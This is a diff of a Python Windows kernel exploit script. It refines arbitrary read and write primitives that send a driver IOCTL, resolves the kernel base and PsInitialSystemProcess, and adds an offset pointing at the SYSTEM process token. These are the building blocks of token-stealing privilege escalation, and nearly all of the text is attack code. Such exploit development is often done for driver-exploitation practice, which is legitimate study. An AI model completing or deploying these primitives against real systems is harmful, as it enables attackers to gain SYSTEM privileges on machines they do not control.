@@ -155,7 +155,7 @@ def get_PsISP_kernel_address(kernel_base):
     return system_kernel_base_pointer
 
 ################################################### WRITE ###########################################################
-def writePrimitive(driver, what=None, where=None):
+def writePrimitive(driver_handle, what=None, where=None):
     what_addr = 0x000000001a001000
     # Write the what value to what_addr
     data = struct.pack('<Q', what)
@@ -201,10 +201,10 @@ def writePrimitive(driver, what=None, where=None):
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
 ################################################### READ ###########################################################
-def readPrimitive(driver, system_kernel_base_pointer, where=None):
+def readPrimitive(driver_handle, system_kernel_base_pointer, where=None):
 
     #We've created a block of memory at the top of userland via dwStatus
-    what_addr = system_kernel_base_pointer #some shit here system token address
+    what_addr = system_kernel_base_pointer + 0x358 #some shit here system token address
     where = 0x000000001a001000
 
     IoControlCode = 0x0022200B
@@ -253,8 +253,8 @@ def executeOverwrite():
     else:
         print '[X] Got handle to the driver.\n'
 
-        getkernelBase(driver_handle)
-        get_PsISP_kernel_address()
-
+        img_name, kernel_base = getkernelBase(driver_handle)
+        system_kernel_base_pointer = get_PsISP_kernel_address(kernel_base)
+        read_value = readPrimitive(driver_handle, system_kernel_base_pointer)
 ############################################ RUN ################################################
 executeOverwrite()
